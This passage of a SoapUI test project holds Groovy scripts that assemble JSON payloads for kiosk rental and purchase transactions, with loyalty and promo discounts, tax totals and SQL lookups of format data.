BigDecimal EstimatedLoyaltyAmount = 0;
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
purchaseformatIDList = purchaseFormatIds.split(",");
rentalformatIDList = rentalFormatIds.split(",");
loyaltyFlagList = loyaltyFlag.split(",");
int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};

//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else
{
     //nothing to do, code looks good
}
//For Purchases
if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	//Will Grab one format a time to build the request.
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    curformatID = rentalformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	
	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : \"Vended\"," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        rentalPayload += "\"MultiDisc\" : false,"
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 0,"
	           
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
			
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
	        }
	        else //For Games
	        {
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
			
			//Calculate Rental Total
			rentalTotal += (gamePrice.toBigDecimal());
			rentalDiscPrice.add(gamePrice);
			rentalNonReturnPrice.add(gameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : null,"
			rentalPayload += "\"DefaultInitialNight\" : null,"
			rentalPayload += "\"DefaultExtraNight\" : null"
			
			rentalPayload += "}," 
			rentalPayload += "\"BlurayUpsell\" : null,"
			rentalPayload += "\"ItemSourceType\" : 3"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
		
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());	    
	}
//TO-DO
	//Have to build Loyalty and Promo payload here.
	//def loyaltyTitleList = Eval.me("[" + rentalTitleIds + "]") ;
	//def loyaltyTitlePrice = Eval.me("[" + rentalTitleIds + "]") ;
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice");
testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())




//Delete Above	
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
			//curLoyaltyTitle = loyaltyTitleList[l].toString().trim();
			//curLoyaltyPrice = loyaltyTitlePrice[l].toString().trim();
			curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
		    	log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
			//promoPayload += "\"RedemptionPoints\": null,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    		log.info ("Flag is 0");
		    	}
		    	//remainingTitles = DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", "");
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now
		      			
		      		}
		      		     	
		      }
		      log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}

	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]") ;
		def getNonLoyaltyProductPrice = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]") ;
		log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");

		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		
		
		def curTitleId = getNonLoyaltyProductId.take(1).toString().replace("[", "").replace("]", "");
		def curTitlePrice = getNonLoyaltyProductPrice.take(1).toString().replace("[", "").replace("]", "").toBigDecimal();
		
		promoPayload += "{";
		promoPayload += "\"ProductId\": $curTitleId,";
		promoPayload += "\"DiscountType\": \"PromotionCode\",";
		promoPayload += "\"PromotionCode\": \"$PromoCode\",";
		if (promoCodeValue > curTitlePrice)
		{
		promoPayload += "\"Amount\": $curTitlePrice";
		}
		else
		{
			promoPayload += "\"Amount\": $promoCodeValue";
		}
		promoPayload += "}";


		def remainingNonLoyaltyProductId = getNonLoyaltyProductId.drop(1).toString().replace("[", "").replace("]", "");
		def remainingNonLoyaltyProductPrice = getNonLoyaltyProductPrice.drop(1).toString().replace("[", "").replace("]", "");
		log.info ("remainingNonLoyaltyProductId:$remainingNonLoyaltyProductId; remainingNonLoyaltyProductPrice:$remainingNonLoyaltyProductPrice");
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",remainingNonLoyaltyProductId);
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",remainingNonLoyaltyProductPrice);		
	}
	log.info ("promoPayload:$promoPayload");
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	//rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	rentalTaxAmt = Round2.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	//grandTotal = Round16.format(grandTotal).toBigDecimal();
	grandTotal = Round2.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}

//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		//purchasePayload += "\"VendStatus\" : \"Vended\"," //TO-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : $digitalCodePrice,"
	            purchasePayload += "\"PriceSetId\" : 1,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"ProductPriceId\" : 1"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : $purchasePrice,"
	            purchasePayload += "\"PriceSetId\" : 1,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"ProductPriceId\" : 1"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}


TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload")
//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build EstimateAccrual Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"MessageType\": \"EstimateAccrual\",";
//requestPayload += "\"MessageType\": \"EstimateRedemption\",";
requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"CreditCard\": {";
requestPayload += "\"FirstName\": \"Redbox\",";
requestPayload += "\"LastName\": \"Server\",";
requestPayload += "\"Number\": \"$EncryptedNumber\",";
requestPayload += "\"PostalCode\": \"60181\",";
requestPayload += "\"ExpirationMonth\": \"12\",";
requestPayload += "\"ExpirationYear\": \"20\",";
requestPayload += "\"KeyId\": $KeyID,";
requestPayload += "\"CardId\": \"$CardID\",";
requestPayload += "\"LastFour\": \"$lastFour\",";
requestPayload += "\"CardType\": $CardType,";
requestPayload += "\"Track2\": \"$EncryptedTrack2\"";
requestPayload += "},";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "}} ";

// log to soapui log
log.info("EstimateAccrual Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
]]></script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
